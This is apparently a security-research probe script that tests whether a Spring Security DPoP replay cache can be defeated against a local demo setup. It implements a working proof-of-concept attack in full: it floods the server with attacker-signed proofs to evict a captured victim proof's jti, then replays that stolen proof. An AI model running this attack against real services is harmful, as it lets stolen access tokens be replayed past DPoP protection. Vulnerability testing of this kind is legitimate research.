"""
E1, loud variant: the attacker supplies the eviction budget.

R* = N/W is derived for honest sustained traffic. This probe tests whether an attacker
who holds a stolen access token can manufacture the eviction himself, independent of
deployment load.

Threat model: FAPI 2.0 A5, the Salesloft archetype. The attacker has the client's stored
access token and has captured one DPoP proof bound to it. He does NOT have the client's
private key.

Mechanism under test, read from DPoPAuthenticationProvider at tag 6.5.5:
  - the validator chain is a DelegatingOAuth2TokenValidator that runs every delegate and
    accumulates errors, it does not short-circuit
  - JtiClaimValidator runs JTI_CACHE.putIfAbsent BEFORE ath and jkt are checked
  - so a proof that will ultimately be rejected on jkt still consumes a cache slot first

Therefore the attacker mints N proofs under his OWN key: unique jti, valid iat, correct
htm/htu. Each is rejected 401 on jkt mismatch, and each inserts one entry. After N such
insertions the victim's captured jti has been evicted and the captured proof replays.

Expected: replay rejected before the flood, admitted after, at idle, with no dependence
on request rate.
"""

import sys
import time
from pathlib import Path

import httpx

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "load"))
from dpop import DPoPKey, fetch_token  # noqa: E402

BASE = "http://localhost:8081"
URL = f"{BASE}/api/resource"
TOKEN_ENDPOINT = "http://localhost:8080/realms/dpop-demo/protocol/openid-connect/token"
N = 1000


def main():
    # Victim: legitimate client, obtains a token and one proof the attacker captures.
    victim = DPoPKey()
    victim_token = fetch_token(TOKEN_ENDPOINT, victim, "demo-client",
                               "testuser", "testpass")["access_token"]

    results = []
    with httpx.Client(timeout=20.0) as client:
        captured = victim.proof("GET", URL, jti="victim-captured-proof",
                                iat=int(time.time()), access_token=victim_token)

        r_first = client.get(URL, headers={
            "Authorization": f"DPoP {victim_token}", "DPoP": captured})
        results.append(("victim proof, first use", r_first.status_code, 200))

        # Immediately, at idle, confirm the baseline replay defence holds.
        r_replay0 = client.get(URL, headers={
            "Authorization": f"DPoP {victim_token}", "DPoP": captured})
        results.append(("victim proof replayed at idle, pre-flood", r_replay0.status_code, 401))

        # Attacker floods with proofs under his OWN key, reusing the stolen access token.
        # Each 401s on jkt but inserts a jti first.
        attacker = DPoPKey()
        flood_status = {}
        t0 = time.monotonic()
        for i in range(N + 50):
            p = attacker.proof("GET", URL, jti=f"attacker-{i}", iat=int(time.time()),
                               access_token=victim_token)
            s = client.get(URL, headers={
                "Authorization": f"DPoP {victim_token}", "DPoP": p}).status_code
            flood_status[s] = flood_status.get(s, 0) + 1
        flood_secs = time.monotonic() - t0

        # Replay the captured victim proof again. If the flood evicted it, admitted.
        r_replay1 = client.get(URL, headers={
            "Authorization": f"DPoP {victim_token}", "DPoP": captured})
        results.append((f"victim proof replayed after {N}+ attacker inserts",
                        r_replay1.status_code, 200))

    print("E1: attacker-supplied eviction (loud variant)")
    print(f"  flood of {N + 50} proofs took {flood_secs:.1f} s at idle")
    print(f"  flood response codes: {flood_status}  (all 401 = rejected on jkt as expected)")
    print()
    ok = True
    for label, got, want in results:
        verdict = "PASS" if got == want else "FAIL"
        if got != want:
            ok = False
        print(f"  {verdict}  {label:52s} expected {want}, got {got}")
    print()
    if results[-1][1] == 200:
        print("  Replay was ADMITTED after the attacker flood, at idle.")
        print("  R* is a budget the attacker spends, not a property of deployment load.")
    if not flood_status.get(200):
        print("  Every flood request was rejected, so no anomaly-free path was used here.")
        print("  This variant is loud: 1000+ 401s are exactly what detection sees.")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
